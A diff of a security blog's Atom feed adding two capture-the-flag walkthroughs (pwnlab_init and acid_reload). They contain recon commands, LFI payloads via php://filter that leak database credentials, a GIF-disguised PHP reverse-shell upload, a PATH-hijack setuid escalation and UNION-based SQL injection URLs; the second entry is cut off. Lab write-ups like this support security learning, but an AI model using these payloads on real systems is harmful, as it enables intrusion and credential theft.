@@ -4,7 +4,7 @@
   <title><![CDATA[Bob1Bob2]]></title>
   <link href="http://wg135.github.io/atom.xml" rel="self"/>
   <link href="http://wg135.github.io/"/>
-  <updated>2016-09-09T15:25:04-05:00</updated>
+  <updated>2016-09-16T14:24:00-05:00</updated>
   <id>http://wg135.github.io/</id>
   <author>
     <name><![CDATA[Bob1Bob2]]></name>
@@ -12,6 +12,596 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[pwnlab_init]]></title>
+    <link href="http://wg135.github.io/blog/2016/09/11/pwnlab-init/"/>
+    <updated>2016-09-11T09:07:37-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/09/11/pwnlab-init</id>
+    <content type="html"><![CDATA[<h2>Tools:</h2>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>DirBuster</li>
+<li>Burp</li>
+</ul>
+
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.50.0/24</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.50.131 is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.50.131 -p-</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 80 is opening.</p>
+
+<p>use nikto to scan</p>
+
+<p><code>nikto -h 192.168.50.131</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use dirbuster to get all dirs and files</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>check the page:</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use sqlmap</p>
+
+<p><code>sqlmap -u "http://192.168.50.131"  --forms --batch --crawl=10 --level=5 --risk=3 --random-agent --dbms=MySQL</code></p>
+
+<p>Nothing.</p>
+
+<p>Check the page souce code,</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>It seems there is a local file inclusion in <code>page</code> parmeter, based on <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/">LFI</a></p>
+
+<p><code>curl http://192.168.50.131/?page=php://filter/convert.base64-encode/resource=config</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get config.php' base64 encoded content</p>
+
+<p><code>echo PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+ | base64 --decode</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get mysql username/password</p>
+
+<p>connect mysql database:</p>
+
+<p><code>mysql -h 192.168.50.131 -u root -pH4u%QJ_H99</code></p>
+
+<p>show databases:</p>
+
+<p><code>mysql&gt; show databases;</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; show tables;
+</span><span class='line'>mysql&gt; use Users;
+</span><span class='line'>mysql&gt; select * from users;</span></code></pre></td></tr></table></div></figure>
+
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>these passwords are base64 encoded</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>kent | JWzXuBJJNy
+</span><span class='line'>mike | SIfdsTEn6I
+</span><span class='line'>kane | iSv5Ym2GRo</span></code></pre></td></tr></table></div></figure>
+
+
+<p>login as kane</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>try to upload webshell, failed. only accept image.</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>in order to find out which file extension do i need</p>
+
+<p>I will get upload.php code</p>
+
+<p><code>curl http://192.168.50.131/?page=php://filter/convert.base64-encode/resource=upload</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>decode the content</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+<span class='line-number'>46</span>
+<span class='line-number'>47</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]))</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;You must be log in.&#39;</span><span class="p">);</span> <span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;html&gt;</span>
+</span><span class='line'><span class="x">  &lt;body&gt;</span>
+</span><span class='line'><span class="x">      &lt;form action=&#39;&#39; method=&#39;post&#39; enctype=&#39;multipart/form-data&#39;&gt;</span>
+</span><span class='line'><span class="x">          &lt;input type=&#39;file&#39; name=&#39;file&#39; id=&#39;file&#39; /&gt;</span>
+</span><span class='line'><span class="x">          &lt;input type=&#39;submit&#39; name=&#39;submit&#39; value=&#39;Upload&#39;/&gt;</span>
+</span><span class='line'><span class="x">      &lt;/form&gt;</span>
+</span><span class='line'><span class="x">  &lt;/body&gt;</span>
+</span><span class='line'><span class="x">&lt;/html&gt;</span>
+</span><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>      <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
+</span><span class='line'>      <span class="nv">$filetype</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
+</span><span class='line'>      <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="s1">&#39;upload/&#39;</span><span class="p">;</span>
+</span><span class='line'>      <span class="nv">$file_ext</span>  <span class="o">=</span> <span class="nb">strrchr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
+</span><span class='line'>      <span class="nv">$imageinfo</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
+</span><span class='line'>      <span class="nv">$whitelist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;.jpg&quot;</span><span class="p">,</span><span class="s2">&quot;.jpeg&quot;</span><span class="p">,</span><span class="s2">&quot;.gif&quot;</span><span class="p">,</span><span class="s2">&quot;.png&quot;</span><span class="p">);</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">)))</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Not allowed extension, please upload images only.&#39;</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">,</span><span class="s1">&#39;image&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 001&#39;</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/gif&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/jpeg&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/jpg&#39;</span><span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/png&#39;</span><span class="p">)</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 002&#39;</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nb">substr_count</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">){</span>
+</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 003&#39;</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$uploaddir</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>
+</span><span class='line'>
+</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile</span><span class="p">))</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$uploadfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br /&gt;&quot;</span><span class="p">;</span>
+</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 4&#39;</span><span class="p">);</span>
+</span><span class='line'>      <span class="p">}</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="p">}</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>so image extensions are <code>$whitelist = array(".jpg",".jpeg",".gif",".png");</code></p>
+
+<p>copy a php reverse shell into a gif file, use burp add <code>GIF</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>then the php shell is uploaded</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now need to find out how to trigger the shell</p>
+
+<p>check index.php</p>
+
+<p><code>curl http://192.168.50.131/?page=php://filter/convert.base64-encode/resource=index</code></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
+</span><span class='line'><span class="c1">//Multilingual. Not implemented yet.</span>
+</span><span class='line'><span class="c1">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span>
+</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]))</span>
+</span><span class='line'><span class="p">{</span>
+</span><span class='line'>  <span class="k">include</span><span class="p">(</span><span class="s2">&quot;lang/&quot;</span><span class="o">.</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]);</span>
+</span><span class='line'><span class="p">}</span>
+</span><span class='line'><span class="c1">// Not implemented yet.</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;html&gt;</span>
+</span><span class='line'><span class="x">&lt;head&gt;</span>
+</span><span class='line'><span class="x">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span>
+</span><span class='line'><span class="x">&lt;/head&gt;</span>
+</span><span class='line'><span class="x">&lt;body&gt;</span>
+</span><span class='line'><span class="x">&lt;center&gt;</span>
+</span><span class='line'><span class="x">&lt;img src=&quot;images/pwnlab.png&quot;&gt;&lt;br /&gt;</span>
+</span><span class='line'><span class="x">[ &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt; ] [ &lt;a href=&quot;?page=login&quot;&gt;Login&lt;/a&gt; ] [ &lt;a href=&quot;?page=upload&quot;&gt;Upload&lt;/a&gt; ]</span>
+</span><span class='line'><span class="x">&lt;hr/&gt;&lt;br/&gt;</span>
+</span><span class='line'><span class="cp">&lt;?php</span>
+</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]))</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>      <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">);</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'>  <span class="k">else</span>
+</span><span class='line'>  <span class="p">{</span>
+</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;Use this server to upload and share image files inside the intranet&quot;</span><span class="p">;</span>
+</span><span class='line'>  <span class="p">}</span>
+</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
+</span><span class='line'><span class="x">&lt;/center&gt;</span>
+</span><span class='line'><span class="x">&lt;/body&gt;</span>
+</span><span class='line'><span class="x">&lt;/html&gt;</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>find out cookie also have LFI.</p>
+
+<p>first verify the LFI</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now setup netcat on port 443</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_018.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get the shell</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_019.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>login in as kane</p>
+
+<p><code>su kane</code></p>
+
+<p>find an interesting file msgmike</p>
+
+<p><code>ls -alh msgmike</code></p>
+
+<p>its seuid is set.</p>
+
+<p>try to run it</p>
+
+<p><code>./msgmike</code></p>
+
+<p>shows <code>cat: /home/mike/msg.txt: No such file or directory</code></p>
+
+<p>try to escape it</p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">export</span> <span class="nx">PATH</span><span class="o">=.:</span><span class="nv">$PATH</span>
+</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;/bin/bash&quot;</span> <span class="o">&gt;</span> <span class="nx">cat</span>
+</span><span class='line'><span class="nb">chmod</span> <span class="o">+</span><span class="nx">x</span> <span class="nx">cat</span>
+</span><span class='line'><span class="o">./</span><span class="nx">msgmike</span>
+</span></code></pre></td></tr></table></div></figure>
+
+
+<p>now escape to user mike.</p>
+
+<p>Find another program&rsquo;s setuid is on</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_020.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>run <code>msg2root</code></p>
+
+<p><code>Message for root:</code></p>
+
+<p>upload <a href="https://github.com/wg135/script/blob/master/suid.c">setuid.c</a>, compiled.</p>
+
+<p>run msg2root, get root</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
+]]></content>
+  </entry>
+  
+  <entry>
+    <title type="html"><![CDATA[acid_reload]]></title>
+    <link href="http://wg135.github.io/blog/2016/09/11/acid-reload/"/>
+    <updated>2016-09-11T08:58:02-05:00</updated>
+    <id>http://wg135.github.io/blog/2016/09/11/acid-reload</id>
+    <content type="html"><![CDATA[<h2>Tools:</h2>
+
+<ul>
+<li>netdiscover</li>
+<li>Nmap</li>
+<li>Wfuzz</li>
+<li>DirBuster</li>
+<li>Burp</li>
+</ul>
+
+
+<h3>Vulnerabilities:</h3>
+
+<!--more-->
+
+
+<p>Use netdiscover to detect target IP address</p>
+
+<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_001.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>192.168.41.170is the target.</p>
+
+<p>Then run nmap to detect opening ports and running services on the target machine.</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.171 -p-</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_002.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>port 22 and 33447 are opening.</p>
+
+<p>Port 33447 is filter, I run nmap again</p>
+
+<p><code>nmap -sV -v -O -A -T5 192.168.41.171 -p 33447</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now I know it is running http service.</p>
+
+<p>use nikto to scan:</p>
+
+<p><code>nikto -h 192.168.41.171:33447</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_004.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find a hidden path &lsquo;/bin&rsquo;</p>
+
+<p>check the page <code>192.168.41.171:33447/bin</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_005.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use DirBuster to scan</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_006.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>use Burpsuit to check when I try to get <code>/bin/dashboard.php</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_007.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>it is redirected to <code>/bin/includes/validation.php</code>. I can use referer bypass</p>
+
+<p>change http request to <code>GET /bin/dashboard.php HTTP/1.1</code> and referer to <code>Referer: http://192.168.41.171:33447/bin/includes/validation.php</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_008.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>forward the traffic</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_009.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>Bypass successfully.</p>
+
+<p>check the source code</p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>got an link <code>l33t_haxor.php</code></p>
+
+<p>check the page code
+<img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_011.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>find <code>l33t_haxor.php?id=</code> looks like sqli</p>
+
+<p>Let&rsquo;s verify</p>
+
+<p>insert</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1'</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_012.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>easy sqli</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1' and true--+</code> no output, so, it is bracket enclosed single quote.</p>
+
+<p>now lets check how many columns we need by inserting null</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null)from(information_schema.columns)WHERE'1'='1
+</span><span class='line'>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),(null)from(information_schema.columns)WHERE'1'='1
+</span><span class='line'>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),(null),(null)from(information_schema.columns)WHERE'1'='1</span></code></pre></td></tr></table></div></figure>
+
+
+<p>when there are two &lsquo;null&rsquo;, no error come back, so the column number is 2.</p>
+
+<p>next check which column holds string value.</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select('test'),(null)from(information_schema.columns)WHERE'1'='1</code></p>
+
+<p>no response</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),('test')from(information_schema.columns)WHERE'1'='1</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_013.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>now we know column holds string value</p>
+
+<p>now get the version</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(NULL),(@@VERSION)from(information_schema.columns)WHERE'1'='1</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_014.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get user,</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(NULL),(user())from(information_schema.columns)WHERE'1'='1</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_015.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>get table name</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1')union(select(null),GROUP_CONCAT(DISTINCT(table_schema))from(information_schema.tables)WHERE'a'='a</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_016.png" title="[title manually exploit [alt text]]" ></p>
+
+<p>got four databases information_schema,mysql,performance_schema,secure_login</p>
+
+<p>get table name</p>
+
+<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=-1')union(select(null),GROUP_CONCAT(DISTINCT(table_name))from(information_schema.columns)WHERE(table_schema)=database()and'test'like'test</code></p>
+
+<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_017.png" title="[title manually exploit [alt text]]" ></p>
+
+<p><code>wget http://192.168.41.171:33447/UB3R/strcpy.exe</code></p>
+
+<p>check the file</p>
+
+<p><code>file strcpy.exe</code></p>
+
+<p><code>strcpy.exe: PDF document, version 1.5</code>. a pdf file in it.</p>
+
+<p>use foremost to recover</p>
+
+<p><code>foremost strcpy.exe</code></p>
+
+<p>in folder <code>output</code>,get a folder called rar and there is a rar file, unzip it , get a file called <code>lol.jpg</code></p>
+
+<p>try to use foremost on this file, get another rar, unzip it get a file called <code>Avinash.contact</code></p>
+
+<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class='xml'><span class='line'><span class="cp">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span>
+</span><span class='line'><span class="nt">&lt;c:contact</span> <span class="na">c:Version=</span><span class="s">&quot;1&quot;</span> <span class="na">xmlns:c=</span><span class="s">&quot;http://schemas.microsoft.com/Contact&quot;</span> <span class="na">xmlns:xsi=</span><span class="s">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> <span class="na">xmlns:MSP2P=</span><span class="s">&quot;http://schemas.microsoft.com/Contact/Extended/MSP2P&quot;</span> <span class="na">xmlns:MSWABMAPI=</span><span class="s">&quot;http://schemas.microsoft.com/Contact/Extended/MSWABMAPI&quot;</span><span class="nt">&gt;</span>
+</span><span class='line'>  <span class="nt">&lt;c:CreationDate&gt;</span>2015-08-23T11:39:18Z<span class="nt">&lt;/c:CreationDate&gt;&lt;c:Extended&gt;&lt;MSWABMAPI:PropTag0x3A58101F</span> <span class="na">c:ContentType=</span><span class="s">&quot;binary/x-ms-wab-mapi&quot;</span> <span class="na">c:type=</span><span class="s">&quot;binary&quot;</span><span class="nt">&gt;</span>AQAAABIAAABOAG8AbwBCAEAAMQAyADMAAAA=<span class="nt">&lt;/MSWABMAPI:PropTag0x3A58101F&gt;&lt;/c:Extended&gt;</span>
